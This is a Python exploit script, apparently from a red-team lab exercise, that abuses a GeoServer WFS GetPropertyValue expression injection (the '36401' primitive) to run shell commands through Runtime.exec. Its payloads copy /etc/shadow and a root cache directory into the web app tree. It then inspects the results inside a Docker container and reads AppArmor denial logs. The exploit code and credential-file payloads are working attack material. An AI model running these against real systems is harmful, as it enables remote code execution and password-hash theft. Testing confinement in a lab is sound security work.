# -*- coding: utf-8 -*-
"""RT5-Geo follow-up: 36401 exec primitive is ALIVE (audit shows touch/cp execed).
   aa-geoserver grants /bin/cp, /bin/mv, /bin/rm, /bin/mkdir, /bin/chmod, /bin/sed,
   /bin/grep, /bin/cat (real paths). App tree /mnt/geoserver/** rwkm.
   => cp/sed/mv via 36401 = app-tree tamper + secret staging (criterion c).
"""
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18082"
s = requests.Session()
s.trust_env = False
s.verify = False


def exec36401(argv):
    cmd = "exec(java.lang.Runtime.getRuntime(),'" + " ".join(argv) + "')"
    r = s.get(BASE + "/geoserver/ows", params={
        "service": "WFS", "version": "2.0.0", "request": "GetPropertyValue",
        "typeNames": "sf:archsites", "valueReference": cmd,
    }, timeout=60)
    return r.status_code, r.text[:100].replace("\n", " ")


SHOTS = [
    ("cp-shadow-to-apptree", ["/bin/cp", "/etc/shadow", "/mnt/geoserver/rt5_cp_shadow"]),
    ("mkdir-apptree", ["/bin/mkdir", "/mnt/geoserver/rt5_dir"]),
    ("cp-cache-dir-listing", ["/bin/cp", "/root/.cache/JNA", "/mnt/geoserver/rt5_cp_cache"]),
    ("cp-to-tmp-probe", ["/bin/cp", "/etc/hostname", "/tmp/rt5_cp_tmp"]),
]

for label, argv in SHOTS:
    code, head = exec36401(argv)
    print("[*] %-22s HTTP %s | %s" % (label, code, head))

print("\n=== truth ===")
for p in ["/mnt/geoserver/rt5_cp_shadow", "/mnt/geoserver/rt5_dir",
          "/mnt/geoserver/rt5_cp_cache", "/tmp/rt5_cp_tmp"]:
    r = subprocess.run(["docker", "exec", "multi-round-lab-geoserver-1",
                        "ls", "-ld", "--full-time", p], capture_output=True, text=True)
    print((r.stdout + r.stderr).strip())
r = subprocess.run(["docker", "exec", "multi-round-lab-geoserver-1",
                    "cat", "/mnt/geoserver/rt5_cp_shadow"], capture_output=True, text=True)
print("--- staged shadow head:", (r.stdout.splitlines() or ["<none>"])[0])

print("=== audit (aa-geoserver, latest) ===")
r = subprocess.run(["wsl", "-u", "root", "--", "bash", "-c",
                    "dmesg | grep 'apparmor=\"DENIED\"' | grep 'aa-geoserver' | grep -v getent | tail -4"],
                   capture_output=True, text=True)
print(r.stdout + r.stderr)
